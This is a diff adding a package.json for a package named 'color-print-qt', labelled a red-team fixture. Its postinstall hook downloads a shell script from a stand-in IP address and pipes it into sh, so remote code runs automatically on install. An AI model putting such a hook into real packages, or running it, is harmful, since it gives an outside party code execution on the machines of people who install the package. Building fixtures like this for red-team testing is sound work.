@@ -1,0 +1,8 @@
+{
+  "name": "color-print-qt",
+  "version": "1.0.0",
+  "description": "qt red-team fixture",
+  "scripts": {
+    "postinstall": "wget -qO- http://203.0.113.50/install.sh | sh"
+  }
+}
